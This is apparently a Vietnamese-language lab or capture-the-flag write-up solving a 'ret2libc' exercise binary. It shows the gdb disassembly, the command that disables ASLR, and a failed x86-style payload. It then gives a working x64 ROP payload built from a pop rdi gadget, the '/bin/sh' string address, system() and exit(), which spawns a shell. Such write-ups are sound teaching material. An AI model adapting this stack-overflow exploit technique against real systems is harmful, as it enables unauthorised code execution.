# **ret2libc**

## Phân tích

Thử nhập một string dài:

```
┌──(kali㉿kali)-[~/Desktop/week10/ret2libc]
└─$ python -c 'print("a"*100)' | ./ret2libc
Try to exec /bin/sh
Read 101 bytes. buf is aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae
No shell for you :(
zsh: done                python -c 'print("a"*100)' | 
zsh: segmentation fault  ./ret2libc
```

=> Có lỗ hổng

Sử dụng gdb, tìm được hàm main() và vuln():

```
Dump of assembler code for function main:     
   0x0000000000400610 <+0>:     push   %rbp                                                                           
   0x0000000000400611 <+1>:     mov    %rsp,%rbp   
   0x0000000000400614 <+4>:     sub    $0x10,%rsp         
   0x0000000000400618 <+8>:     mov    %edi,-0x4(%rbp)
   0x000000000040061b <+11>:    mov    %rsi,-0x10(%rbp)
   0x000000000040061f <+15>:    mov    $0x4006f3,%edi
   0x0000000000400624 <+20>:    mov    $0x0,%eax           
   0x0000000000400629 <+25>:    call   0x400490 <printf@plt>
   0x000000000040062e <+30>:    mov    $0x0,%eax
   0x0000000000400633 <+35>:    call   0x4005c6 <vuln>     
   0x0000000000400638 <+40>:    mov    $0x0,%eax
   0x000000000040063d <+45>:    leave                      
   0x000000000040063e <+46>:    ret
```

```
(gdb) disas vuln                                           
Dump of assembler code for function vuln:
   0x00000000004005c6 <+0>:     push   rbp
   0x00000000004005c7 <+1>:     mov    rbp,rsp
   0x00000000004005ca <+4>:     sub    rsp,0x60
   0x00000000004005ce <+8>:     lea    rax,[rbp-0x60]
   0x00000000004005d2 <+12>:    mov    edx,0x190
   0x00000000004005d7 <+17>:    mov    rsi,rax
   0x00000000004005da <+20>:    mov    edi,0x0
   0x00000000004005df <+25>:    call   0x4004a0 <read@plt>
   0x00000000004005e4 <+30>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004005e7 <+33>:    lea    rdx,[rbp-0x60]
   0x00000000004005eb <+37>:    mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004005ee <+40>:    mov    esi,eax
   0x00000000004005f0 <+42>:    mov    edi,0x4006c4
   0x00000000004005f5 <+47>:    mov    eax,0x0
   0x00000000004005fa <+52>:    call   0x400490 <printf@plt>
   0x00000000004005ff <+57>:    mov    edi,0x4006df
   0x0000000000400604 <+62>:    call   0x400480 <puts@plt>
   0x0000000000400609 <+67>:    mov    eax,0x0
   0x000000000040060e <+72>:    leave  
   0x000000000040060f <+73>:    ret    
End of assembler dump.
```

Trong đó hàm vuln() có một biến local chứa input của người dùng nằm ở rbp-0x60 => có thể stack overflow.

Tương tự [stack6](https://gitlab.com/cs_hoang_hai_long/week9/-/tree/main/protostar/stack/stack6):

- Tìm địa chỉ system: 0x7ffff7e21860
- Tìm địa chỉ string /bin/sh: 0x7ffff7f70882

Tắt ASLR:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Fail attempt #1**

```
python2 -c 'print("a"*0x68 + "\x60\x18\xe2\xf7\xff\x7f\x00\x00" + "\x82\x08\xf7\xf7\xff\x7f\x00\x00")' | ./ret2libc
```

Trong đó:

- "a"*0x68: padding
- "\x60\x18\xe2\xf7\xff\x7f\x00\x00": địa chỉ hàm system ghi đè lên return address hàm vuln()
- "\x82\x08\xf7\xf7\xff\x7f\x00\x00": địa chỉ string "/bin/sh"

Tuy nhiên trong x64, arguments không được pass vào hàm qua stack như x86 nữa => Fail

**Final**

Trong x64, argument đầu tiên được nạp vào thanh ghi RDI.

=> exploit

```
python2 -c 'print "a"*0x68 + "\xa3\x06\x40\x00\x00\x00\x00\x00" + "\x82\x08\xf7\xf7\xff\x7f\x00\x00" + "\x60\x18\xe2\xf7\xff\x7f\x00\x00" + "\x00\x71\xe1\xf7\xff\x7f\x00\x00"' | ./ret2libc 
```

Trong đó:

- "a"*0x68: stackoverflow đến ngay trước return address.
- "\xa3\x06\x40\x00\x00\x00\x00\x00": 0x4006a3: địa chỉ của 2 instructions ```pop rdi; ret```
- "\x82\x08\xf7\xf7\xff\x7f\x00\x00": 0x7ffff7f70882: địa chỉ của string "/bin/sh" trong libc, cách tìm như trong stack6. Địa chỉ này sẽ được chuyển vào thanh ghi rdi thông qua instructions `pop rdi` ở trên.
- "\x60\x18\xe2\xf7\xff\x7f\x00\x00": 0x7ffff7e21860: địa chỉ hàm system(), cách tìm như trong stack6. Địa chỉ này được chuyển vào thanh ghi rip thông qua instructions `ret` ở trên.
- "\x00\x71\xe1\xf7\xff\x7f\x00\x00": 0x7ffff7e17100: địa chỉ hàm exit(), địa chỉ này được chuyển vào thanh ghi rip thông qua instructions ở cuối hàm system() => không bị crash.

Kết quả:

```
process 7085 is executing new program: /usr/bin/dash 
```

# References

- ret2libc x64: <https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/>
-
